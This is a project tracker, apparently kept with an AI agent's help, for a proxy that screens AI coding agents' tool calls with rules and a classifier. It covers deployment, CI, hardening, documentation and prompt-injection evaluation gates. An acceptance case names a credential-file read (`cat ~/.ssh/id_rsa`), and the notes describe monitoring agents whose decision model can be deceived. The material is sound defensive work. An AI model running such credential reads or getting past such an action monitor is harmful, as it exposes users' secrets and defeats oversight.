  - General policy/evaluator fixes and all reachable local injection/report portions are implemented/verified and independently CLEAN after green972; parent same121case POL proof84+12 allows→0+0 with capability/path84 and controls preserved, EVAL paired proof verified identity/mapped attacks/empty rejection, G2406/fresh validation/current cf3dd offline refresh PASS. Numerical rules-only accuracy still FAILS honestly. P7-3 full checkbox remains UNCHECKED: current EACH configured trusted-provider+ordered-chain corpus+wrappers dangerous100%/safe≤5%/wrapped0/errors0 and independently audited provenance remain UNVERIFIED under R8, with the fresh scoped prerequisite blocker above. No further doable local C12 work remains; labels/templates/report archives unchanged, owned helpers cleaned and evidence retained. No universal policy-safety, real receipt/live pass, whole-goal completion or C13 selection is claimed.
  - EVAL-03 ownership clarification: corpus cases/labels/templates/provenance and README historical observations remain frozen; B exclusively updates ONLY `eval/README.md` gate/report/CLI semantics to match v2, with no A/I overlap. This documentation migration does not authorize data or historical-metric changes.

- [x] P7-4 调参文档
  - shadow 模式一周校准流程、阈值调整原则（提高 yes 阈值降误拦、降低阈值提召回、不对少量样本过拟合）、如何新增只读程序与敏感路径、如何读审计日志。
  - 位置：`docs/tuning.md`。
  - 完成标准：文档引用 `src/policy/constants.ts` 与 `audit tail` 的真实输出示例。
  - 使用现有审计 cost_usd（两阶段）给出按 UTC 日期汇总每日估算成本的可复制手工聚合例子及脱敏输入/输出；明确 unknown cost 不按 0 冒充、重试实际调用避免重复记账；不新增命令/服务。
  - Parent-observed C12 proof after union G (38 files / 2260 tests, typecheck/lint/build PASS): real normalizer/gate/provider factories/review adapter/logger with strict in-process mocked HTTP, followed by actual built `audit tail`; no real providers, sockets or action execution. `docs/tuning.md` contains exact sanitized JSONL from `artifact://988` and actual UTC 2026-10-29 aggregation: records=3, known record cost=$0.000086, unknown records=2, known stage cost=$0.0001, unknown stages=3, final-response subtotal=$0.000086, total=null. Retry calls were decision=2/review=2 and are not double-counted. This closes documentation/accounting-example criteria, not production billing or P7-2/3 metric acceptance.

### Phase 8：打包、部署、加固与文档

- **CURRENT C15 ACTIVE — fresh core GREEN:** parent bg71 all6 union/type/lint/2495tests48files/build/coverage/docs PASS with confirmed owned lifecycle; coverage1574/1596=98.62%/skipped0/exclude[]/all required groups and each stream≥90. Bg72 all9 actual1000-text direct/proxy pairs pass strict50ms/5ms-per-event, bg73/74 SOURCE/BUILT validation+offline selected safety PASS but accuracy FAIL54/57/release incomplete/NO receipt, bg70 isolated public-registry audit0 vulnerabilities, bg67 owned8484/log-prefix smoke PASS. Only fully verified global rows below are checked; combined p95/full-live/native/cache/GUI/HTTPS/cloud/publication rows remain unchecked with local subportions recorded. New genuine2.1.312 strict native/mixed investigation is locally actionable/in progress, NOT deferred solely by old317/real-provider keys; P8-6 lesson mapping awaits formal accounting. No C15 closure/Git authority is implied.
- C14 LOCALLY CLOSED by the approved three-ledger status checkpoint after green exact21 draft `8e2b27e4f60263f0d787ae7c17dc63dc16b56978`: G2494/docs-check/causal checker proof/all3 scoped formal reviews/SAME final accounting CLEAN, private staging and genuine Claude2.1.312 README mock proof complete; P8-5 CHECKED with all disclosed adaptations. Full P8-3 `PR 上 CI 绿色；打 tag 后镜像可拉取` stays UNCHECKED: authorized hosted/publication/current real provider+chain full report/independent receipt/operational trust root remain unverified, not waived or inferred absent. Exact five-SOURCE cleanup admitted/deleted/absence observed; all reports/raw QA/data roots preserved. No push/signals/broad pruning/bg62 retroproof. Closing commit uses original core/user-attested window and only3 status paths; C15 unselected until Main observes commit and rereads tracker.
- P8-5 own criterion CHECKED by Main after SAME FormalDocs acceptance review CLEAN/new[]: parent bg65 genuine Claude2.1.312 installed-client text-only mock connection PASS, plus G2494/actual schema/init docs-check. Disclosures: fake loopback backends, init-issued token, model/route-wide rewrite/private-audit-path substitutions; fresh HOME preseeded hasCompletedOnboarding (not vendor first-run wizard); relative proxy launcher executed admitted installed bundle with pinned Node (not an additional bin/shebang execution test). No native safeguards/provider/cache/five-turn/HTTPS/P8-3 credit. Hosted PR/tag/GHCR/full trusted evidence remain unverified; C14 ACTIVE/C15 unselected; bg64 failed404 and bg62 unclassified preserved.
- Historical C14 checkpoint before native bg65: parent bg63 typecheck/lint/47files2494tests/build/real docs-check PASS. Snippet finding causally reproduced22FAIL/10PASS then unchanged32/32PASS and SAME-reviewer CLOSED/CLEAN; Docs CLEAN; Workflow scoped CLEAN after REL001 DISCARDED/prior HIGH WITHDRAWN outside locked hostile-relay threat model, NOT FIXED. Trusted-source/maintainer compromise risk retained; no expanded controller/ACL architecture. Actual C331 pack/install/tree admission PASS; bg62 remained unclassified/no connection or cleanup credit and diagnostics were pending at that time. The later bg65/P8-5 approval and C14 closure above supersede that pending state without relabeling earlier failures.
- Parent authorized exact21-file green C14 implementation-only DRAFT after G2467/docs-check/actionlint syntax, four actual negative release CLI rejections and real SOURCE CI offline producer EXIT0. Offline safety PASS/numerical accuracy FAIL/release incomplete/NO trusted receipt; hashes in PROGRESS. SAME-reviewer separately cleared private MJSFD44/Python2B14 and staging6061/findings[]; actual pack/install/vendor connection remain unexecuted/unverified. Public PR/tag/registry/auditor-full evidence unverified; full P8-3/P8-5 unchecked/C14 ACTIVE/C15 unselected.
- Parent C14 bg55 22:20:02 typecheck/lint/47files2467tests/build and real docs-check PASS; actionlint1.7.12 syntax EXIT0/no output (shellcheck/pyflakes disabled/no ignore). P8-5 key/schema/init-snippet criterion locally verified ONLY. Static onboarding/staging clearance is not observed vendor connection, hosted CI or publication acceptance; full P8-3/P8-5 stay unchecked. No C14 closure/C15 selection/provider/release credit.
- C13 LOCALLY CLOSED after C12 closure4b6b9ab and green correctioncfd846c: ONLY P8-1/P8-2/P8-4 LOCAL scope completed after parent proofs/all3 formal correction reviews CLEAN/owned cleanup. P8-1/P8-4 own criteria CHECKED; full P8-2 public criterion remains UNCHECKED/BLOCKED as below. C14/C15 remain unselected; no full P7/provider/R8 release acceptance follows from local package/security/container evidence.
- **Historical C14 selection** after committed C13 closure `f002c0e6755557f309e89ec79219e6c6afd67602`: only existing P8-3/P8-5 local workflow/documentation scope was active and C15 was then unselected. Edits/unexecuted helpers did not check acceptance; actual PR CI/tag/GHCR and README connection required observations. C14 subsequently closed at e84 with P8-5 approved and P8-3 external pending; current C15 selection is recorded above. Original public HTTPS/provider/native/cache/multi-turn blockers and P8-1/P8-4 checked status remain preserved.
- Historical initial DRAFT checkpoint: parent bg30 G2444/typecheck/lint/build, audit0/source+built validation; source5b4 fingerprints match cf3dd, offline-safety PASS/accuracy FAIL/release incomplete/live unverified. This checkpoint alone did not close any P8 task. Scoped selected deployment prerequisites remain missing, not exhaustive configuration/domain absence.
- Current logger repair: unchanged A4AE BEFORE EXIT1 child/grandchild mutation leakage → AFTER EXIT0/all checks true; fresh bg31 typecheck/lint/build/43files2447tests PASS. This does not close full P8-4/C13. P8-1's later actual packed-consumer evidence is accounted separately below.

- [x] P8-1 构建与发布配置
  - `tsup` 产出 `dist/`（ESM、shebang、sourcemap）；`package.json` `files` 只含 `dist`、`README*`、`LICENSE`；可选 `npm run build:binary` 用 `bun build --compile` 产单文件。
  - 位置：`tsup.config.ts`、`package.json`。
  - 完成标准：`npm pack` 后在干净目录 `npx ./auto-mode-proxy-*.tgz --version` 成功。
  - Parent actual819E/bg41 reached installed-http-boundaries after ASSERTED real npm pack, clean-directory actual relative-tarball npx version0.1.0, installed ESM/shebang/sourcemap/files admission, default asset validation/offline eval, token/init/check/audit and owned listener admission. Final cleanup all true. These satisfy P8-1's own package criterion; optional Bun not required. The subsequent HTTP failure is NOT package/full-security/container/public-HTTPS acceptance; P8-2/P8-4/C13 remain open.

- [ ] P8-2 Docker 与 Compose
  - 多阶段 `Dockerfile`（`node:24-alpine`，非 root 用户，`npm ci --omit=dev`，`HEALTHCHECK` 访问 `/healthz`）；`docker-compose.yml`：`proxy`（监听 `0.0.0.0:8484` 但不 `ports` 发布，挂载配置与审计卷，`env_file`）+ `caddy`（`caddy:2`，发布 `443`/`80`，`Caddyfile`：`{$DOMAIN} { reverse_proxy proxy:8484 }`）；`.env.example`。
  - 位置：`deploy/{Dockerfile,docker-compose.yml,Caddyfile,.env.example}`。
  - 完成标准：`docker compose up` 后 `curl https://$DOMAIN/healthz` 返回 200，`ss -ltnp` 显示宿主机仅 Caddy 的 443/80 对外。
  - LOCAL proof COMPLETE / full checkbox UNCHECKED-BLOCKED: parent historical6282/bg50/artifact1108 and repaired-code unchanged6282/bg53 EXIT0/83.49s/artifact1121 observed BOTH mandatory phases: actual internal Caddy→proxy→HTTPSmock relay AND decision/sanitized audit persistence/nonrootUID1000/RO config+root/no proxy+mock host ports/resource caps; then real Docker127-only Caddy publication→proxy health with static health-only unknown-route/POST denial, no host-Node substitute. Physical worker bounds3221225472/swap0/pids256, owned cleanup/absence and preexisting vendor refs retained. Phase2 Caddy ordinary frontend has explicit egress authority, NOT kernel-no-egress/public TLS; proxy/mock internal throughout. Exact remaining criterion: “docker compose up 后 curl https://$DOMAIN/healthz 返回200，ss -ltnp 显示宿主机仅 Caddy 的443/80对外”. Scoped1046 selected deploy/.env/config.yaml absent and projected DOMAINfalse; ownership/authorized host/DNS/inbound80/443 UNKNOWN. No full public HTTPS/domain/provider claim. All reachable local work and three formal reviews/owned cleanup are complete; C13 LOCALLY CLOSED, C14 not yet selected.

- [ ] P8-3 CI/CD
  - `ci.yml`：lint、typecheck、unit + integration、`eval --rules-only`；若存在 provider 密钥 secrets 则追加完整 eval。`release.yml`：tag 触发构建推送 `ghcr.io/evegoodevening/auto-mode-proxy`，存在 `NPM_TOKEN` 时 `npm publish`。
  - 位置：`.github/workflows/{ci,release}.yml`。
  - 完成标准：PR 上 CI 绿色；打 tag 后镜像可拉取。
  - **C12 A/A supersession / C14 consumer:** no-secret PR gate is v2 offline-safety, with separate explicitly numerical accuracy and raw uncertainty/coverage artifacts; no scalar green hiding failed accuracy. Optional provider-job skip or missing/stale/subset/mock/rules-only report cannot unlock release. Release requires current v2 full-accuracy/all-configured-provider+chain report validated by `assertFreshReport` with independently audited trusted-run receipt bound to report SHA256/current config+engine, plus all seven current fingerprints. Exact schema/API/exit/trust contract: DESIGN amendment. Old offline 5% CI clause retained only as history, explicitly superseded by user decision; live 100%/≤5%/wrapped-zero remains mandatory.

- [x] P8-4 安全加固
  - 非 loopback 监听时强制 `client_tokens` 非空；请求体上限 64 MB；上游连接/读超时；`trust_proxy` 开启时解析 `X-Forwarded-For` 用于日志；pino 序列化器屏蔽 `authorization`、`x-api-key`、`cf-aig-authorization` 与配置中的 key；`/_amp/status` 访问控制；依赖 `npm audit` 无高危。
  - 响应缓冲/截止从 C05 即执行：单 tool/未闭合帧 1 MiB、单响应扣留总量 8 MiB（含有序后缀/参数/终态/重编码暂存，thinking/reasoning 子集 ≤4 MiB，不限 compat）、执行/兼容块完成 60 s、上游静默 30 s、判定全轮 60 s；后缀/ping 不重置截止。超限/EOF/超时整轮未发执行 fail-closed、取消上游，无 allow 泄漏；mock 假时钟与超大/不完整流覆盖。64 MB 入站上限不替代这些界限。
  - 位置：`src/server/{app,auth,upstream,status}.ts`、`src/util/log.ts`。
  - 完成标准：集成测试覆盖无 token 启动失败与超限 413；日志样本 grep 无凭证。
  - Historical pre-C13-RUNTIME-001 own checkpoint (superseded by reopening below): bg49 2026-10-29 08:16:36 typecheck/lint/43files2447tests/build PASS included3940 real source-CLI empty-token listen0/token-present control listen1 DENIED/ordinary outbound0. E21D/bg45 installed64MB413/auth/relay/status/XFF/logging, retained timeout/chunk/response bounds/ACL tests, causal A4AE logger repair and audit0 remain genuine exercised evidence. Independently cleared F483/bg48 built startup EXIT0/9.02s verified token transition, zero network/subprocess attempts and full cleanup. None covers the newly reproduced malformed-stream diagnostic leak; no present P8-4/C13 closure follows.
  - REVALIDATED/CHECKED after parent-authorized LOCAL closure of correctioncfd846c: all3 formal correction reviews CLEAN/new[] (`C13RuntimeFixReview` HIGH-confidence RUNTIME001 CLOSED, `C13PackageFixReview`, `C13AccountingFixReview`). Same immutable F108 SOURCE BEFORE1115→AFTER1116 proves configured-placeholder/private-marker/enumerable-diagnostic disclosure TRUE→FALSE in both pre-byte/observed-prefix cases. Actual console.error stays enabled; exact prefix/withholding/cancellation/visible failure/cleanup held; neither OLD case showed false200 EOF. Parent bg51 2026-10-29 09:43:35 type/lint/44files2449tests/build PASS includes both EF03 regressions. Current repaired-code E21D/bg52/artifact1120 package+all CLI+valid HTTP/auth/413/status/XFF/credential-free logs/cleanup PASS and6282/bg53/artifact1121 actual new-image two-phase Docker PASS. Prior source/built startup token-negative/control proofs, retained response/timeout/ACL bounds and isolated npm audit0 remain valid; dependencies unchanged. All reachable local C13 work/owned cleanup complete; final closure docs only/source/tests unchanged. Full P8-2 public criterion remains separately UNCHECKED/BLOCKED; no public HTTPS/real model/R8 release/native/global acceptance or C14 selection.

- [x] P8-5 文档与威胁模型
  - `README.md` / `README.zh-CN.md`：一分钟接入（init → serve → 三种 agent 片段）、架构图、成本估算（每 100 次判定约 $0.003，灰区二审每次约 $0.0002）、配置参考链接；`docs/threat-model.md`：防御范围与明确非目标（不防文本内容篡改、不是沙箱、决策模型可被欺骗故以规则与 fail-closed 兜底）、隐私说明（命令发往第三方决策提供方、脱敏、各网关 ZDR 差异）；`docs/config.md` 全字段说明；`docs/compat.md` 版本验证矩阵。
  - 位置：`README.md`、`README.zh-CN.md`、`docs/{threat-model,config,compat}.md`。
  - 完成标准：新用户仅凭 README 完成 Claude Code 接入；文档中所有配置键与 `src/config/schema.ts` 一致（脚本校验）。
  - Main-approved own acceptance after SAME FormalDocs CLEAN/new[]: actual bg65 installed genuine Claude2.1.312 with fresh isolated HOME, init-issued token and exact README commands/disclosed loopback/model/rewrite/private-audit substitutions observed authenticated marker connection; G2494/docs-check and corrected init-emission regressions verify schema/snippets. HOME hasCompletedOnboarding preseed and namespace-local pinned-Node launcher are disclosed, not vendor wizard/new bin-link/shebang execution proof. This checks ONLY P8-5, not P8-3/whole C14/native approvals/cache/real providers/five-turn/public HTTPS.

- [ ] P8-6 维护 Lessons
  - 实现过程中把库版本、API 怪癖（如 OpenRouter systemone 模型 ID 形式、Cloudflare 信封、Claude Code 版本行为）追加到 `AGENTS.md` 的 Lessons。
  - 位置：`AGENTS.md`。
  - 完成标准：每个调查任务（P2-6、P3-4、P3-5、P5-2、P6-3）结束后至少新增一条。

## Validation

- [x] `npm run typecheck`、`npm run lint`、`npm test` 全绿；单测覆盖 `src/policy`、`src/gate`、`src/protocols/*/stream.ts` 行覆盖 ≥ 90%。
  - Parent bg71:48files2495tests/all6commands PASS; exact total1574/1596=98.62%, policy373/376=99.20%, gate390/391=99.74%, streams Anthropic303/318=95.28%/Chat214/216=99.07%/Responses294/295=99.66%; no exclusions/skips/threshold slack, owned ECHILD+stdio/control EOF confirmed. Earlier bg68 fixture failure retained, not a production privacy-fix claim.
- [x] 集成测试：三种协议 × {良性放行、注入拦截、并行部分拦截、provider 全挂 fail-closed、shadow 直通、vault 401、passthrough 直通、classifier 改道换凭证} 全部通过。
  - Parent current fullG revalidated existing36-case actual HTTP matrix. Classifier portion retains R7's exact supported Anthropic-shaped fingerprint across ingress; native Responses/Chat classifier formats remain unsupported, not invented as SDK/native acceptance.
- [ ] SSE 透传性能：mock 上游 1000 事件流经代理，首事件额外延迟 < 50 ms，纯文本总额外延迟 < 5 ms/事件；带 tool call 的响应末尾等待 p95 ≤ 1.5 s（Jev）或 ≤ 0.5 s（Clef-flash）。
  - [x] LOCAL mock1000-text portion: parent bg72 all9 measured pairs/three protocols, lifecycle5/8/3 separately counted, parityTRUE/two incremental acknowledgements, max first-event extra5.585779ms/max TOTAL extra per actual text event0.041807809ms<strict50/5. Real Jev/Clef tool-tail p95 remains unmeasured; whole checkbox stays unchecked.
- [ ] C08 ordered-content barrier：tool0→text1 实际 native/rewrite mixed regression 原严格观察器通过（captured event order + immediately-next-request ordered blocks/exact explanation）；早期/纯文本 <5 ms 不变，后缀等待单列。多个 tool/部分拒绝、thinking/signature 子集与总量、未知有状态后缀、ping/error 即时、慢判定/背压、ID/EOF/超时/取消、nonstream parity、raw nonblocking shadow 均覆盖。计划定向 re-review green 是生产补丁前置，不是修复或实机通过证据。
  - Old2.1.311 native317 strict replay/reason FAIL remains preserved; rewrite349 all3PASS does not green the combined gate. Genuine2.1.312 and working bg65 namespace/auth are changed prerequisites, making a NEW harmless strict print investigation locally actionable/in progress under proposal/Safety review. No current2.1.312 tool-capable result/opt-in eligibility is yet observed; do not defer it solely because of old317 or absent real-provider keys, nor relax any original strict criterion.
- [ ] 评测门槛：`auto-mode-proxy eval` 对配置链 拦截率 100%、误拦 ≤ 5%、注入翻转后危险放行数 0；报告归档于 `eval/reports/`。
- [ ] 实机 QA（记录到 `docs/compat.md`）：Claude Code CLI（原生 `safeguard_results` 路径与改写路径各一次）、Claude Desktop、Codex CLI 与桌面版（`--yolo` 与 Approve for me）、WorkBuddy（自动审批开启）各完成一次注入拦截验证与一次 ≥ 5 轮正常对话。
- [ ] C12 A/A split evidence: fresh actual rules-only whole audited corpus+wrappers passes offline-safety with separate honest measured accuracy/raw uncertainty/full denominators; fresh all-configured trusted-provider+chain 100%/≤5%/zero wrapped allow/zero errors report and independently audited provenance required before full P7/release. POLICY_VERSION `c12.1` and current corpus/templates/policy/overrides/config/chain/engine fingerprints required; immutable failed v1 report and historical audit988 do not satisfy freshness. C15 records offline and full-live acceptance separately; neither is checked by plan approval alone.
  - [x] Fresh offline subportion ONLY: SOURCE and BUILT actual two-command validation/rules-only runs PASS selected safety, separate private600 archives/distinct engines; danger93/93, safe false-block54/57 (accuracyFAIL), raw gray134/150, wrapped allows0/279/errors0/flips0/186/release incomplete/live unverified/NO receipt. Full trusted EACH-provider+chain/authorized provenance remains unverified, so whole checkbox stays unchecked.
- [ ] Prompt cache 回归：Claude Code 经代理第二轮 `cache_read_input_tokens > 0`；改道的 classifier 请求响应中 `cache_read_input_tokens` 不恒为 0。
- [ ] 安全检查：本地 `ss -ltnp` 仅 `127.0.0.1:8484`；云端仅 Caddy 443/80；审计日志与 pino 日志 grep 无 `amp_`、`sk-`、`Bearer ` 明文；`npm audit --audit-level=high` 无告警。
  - [x] LOCAL source-app/socket/log/persisted-audit/public-dependency audit subportions: actual own127.0.0.1:8484/ss row1/health200,153 enabled log bytes/no configured literals or raw amp_/sk-/Bearer prefixes; corrected real HTTP regression exercises provider deny/audit/log/response privacy; isolated npm audit actual0 vulnerabilities/no install/fix/publish. Cloud public80/443 and complete external portion remain unverified; whole checkbox stays unchecked.
- [ ] 部署演练：从空机器按 `README.md` 完成本地 `npx` 启动与云端 `docker compose up`，Claude Code 通过 https 地址接入成功。
- [x] 文档一致性：脚本比对 `docs/config.md` 键集合与 zod schema；`init` 打印的三段接入片段与 `docs/agents/*.md` 一致。
  - Actual fresh bg71 real docs-check agreement; preserved unchanged32 negative/positive tests and corrected unique/order/essential-declaration checks, no raw generated-token assertions or source-truth copy.

## Execution accounting (all tasks retained; explicit safety clarifications)

- 只按 PROGRESS 的 C01 → C15 顺序选择一块；块内允许文件不相交的并行单元，所有单元合入后由主协调者统一验证、独立评审、记账、提交，再选下一块。计划评审 green 前不得开始实现。
- 原任务复选框只在所有原验收部分都有证据时勾选。代码完成但真实 provider / CLI / GUI / HTTPS / 发布验收未完成时仍留 `[ ]`，在 PROGRESS 记“本地完成；某验收待前提/待执行”，不能把整个任务排除为 blocked。未知前提必须先安全调查，不能把未知当作缺失。
- P0-3 分布在 C01（version）、C03（init/token）、C04（serve）、C07（check/audit）、C12（eval）；每次只注册真正可用的命令，不允许 stub。P3-6 分布在 C08（Anthropic 与共享 mock）、C10（Responses）、C11（Chat），到 C11 才能满足三协议部分。P8-6 随各调查记录，C15 核账。
- 原泛化 other/显式 tool_map other 直接 allow 保留；此前“未知 other 一律 review”收窄方案 DISCARDED，原因是未经批准的范围/产品策略变更，不要求用户批准未请求变更。敏感检查先于只读豁免落实原 `cat ~/.ssh/id_rsa` review 验收；写截断/ID 碰撞/缓冲超限 fail-closed 等其余已接受修正不变。隐藏能力的 other、误映射及 Task 不可见委派残余风险见 DESIGN/PROGRESS。危险 exact-string 原验收保留 inert 证据，安全实机 denial probe 为额外证明，原外部未证实项不勾选；自动 fallback 必须 scoped classifier 信号和真实轨迹。完整处置表见 PROGRESS；独立最终记账复审 pending。
- 本地无密钥 gate、真实服务 gate、手工 GUI gate、发布/部署 gate 分列记账；mock 不可代替原文真实验收，rules-only 不可冒充真实 provider 的 100%/≤5% 评测。此规划未运行测试/lint/format/build，也未提交。